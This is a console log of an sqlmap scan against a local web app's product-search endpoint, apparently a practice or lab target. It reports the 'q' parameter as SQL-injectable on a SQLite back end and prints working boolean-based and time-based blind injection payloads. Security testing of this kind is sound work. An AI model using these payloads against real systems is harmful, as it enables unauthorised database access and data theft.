        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:47:29 /2026-06-26/

[20:47:29] [WARNING] using '/output' as the output directory
[1/1] URL:
GET http://localhost:3001/rest/products/search?q=apple
do you want to test this URL? [Y/n/q]
> Y
[20:47:29] [INFO] testing URL 'http://localhost:3001/rest/products/search?q=apple'
[20:47:29] [INFO] using '/output/results-06262026_0847pm.csv' as the CSV results file in multiple targets mode
[20:47:29] [INFO] testing connection to the target URL
[20:47:31] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:47:31] [INFO] testing if the target URL content is stable
[20:47:31] [INFO] target URL content is stable
[20:47:31] [INFO] testing if GET parameter 'q' is dynamic
[20:47:31] [INFO] GET parameter 'q' appears to be dynamic
[20:47:31] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
[20:47:31] [INFO] testing for SQL injection on GET parameter 'q'
[20:47:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:47:32] [INFO] GET parameter 'q' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[20:47:32] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) and risk (2) values? [Y/n] Y
[20:47:32] [INFO] testing 'Generic inline queries'
[20:47:32] [INFO] testing 'SQLite inline queries'
[20:47:32] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[20:47:32] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[20:47:32] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[20:47:37] [INFO] GET parameter 'q' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
[20:47:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:47:37] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:47:37] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[20:47:37] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[20:47:37] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[20:47:37] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[20:47:37] [INFO] checking if the injection point on GET parameter 'q' is a false positive
[20:47:38] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 171 HTTP(s) requests:
---
Parameter: q (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=apple%' AND 5078=5078 AND 'GiYb%'='GiYb

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: q=apple%' AND 3980=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'wKWR%'='wKWR
---
do you want to exploit this SQL injection? [Y/n] Y
[20:47:38] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[20:47:38] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 141 times
[20:47:38] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/output/results-06262026_0847pm.csv'

[*] ending @ 20:47:38 /2026-06-26/

